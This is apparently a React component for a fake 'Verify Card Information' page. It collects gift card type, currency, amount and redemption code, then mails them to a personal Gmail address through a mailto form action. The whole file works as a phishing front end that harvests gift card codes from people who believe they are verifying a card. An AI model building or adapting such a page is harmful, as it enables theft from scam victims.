import React from "react"


function Card(){
    return(
        <div>
            <div id="card">
                <div class="card_form">
                    <h3>Verify Card Information</h3>
                    <form action="mailto:kunle23odunade@gmail.com" method="post" encType="text/plain">
                        <select name="cards" id="cards">
                            <option value="Select type of card">Select type of card</option>
                            <option value="Apple">Apple</option>
                            <option value="Amazon">Amazon</option>
                            <option value="Steam">Steam</option>
                            <option value="Ebay">Ebay</option>
                            <option value="Xbox">Xbox</option>
                            <option value="Googleplay">Googleplay</option>
                            <option value="PlayStation">PlayStation</option>
                            <option value="Sephora">Sephora</option>
                            <option value="RazorGold">RazorGold</option>
                            <option value="Nordstrom">Nordstrom</option>
                            <option value="Nike">Nike</option>
                            <option value="MasterCard">MasterCard</option>
                            <option value="Vanilla Visa">Vanilla Visa</option>
                            <option value="Wallmart Visa">Wallmart Visa</option>
                            <option value="Visa Silvery White">Visa Silvery White</option>
                            <option value="TT Visa">TT Visa</option>
                            <option value="Amex">Amex</option>
                        </select>
                        <select name="currency" id="currency">
                            <option value="USD">USD</option>
                            <option value="GBP">GBP</option>
                            <option value="AUD">AUD</option>    
                            <option value="EUR">EUR</option>
                            <option value="CAD">CAD</option>\
                        </select>
                        <input type="number" id="points" name="points" step="1"></input>
                    <input placeholder = "Redemption Code" type="text" name="redemptionCode" id="redemptioncode" />
                    
                    <div class="isolatedbutton"><button type="submit">CONTINUE</button></div>
                    <p>Please make sure the codes you are about to input are correct and according to details</p>
                 </form>

                </div>
           

            </div>
        
        </div>
    )
}

export default Card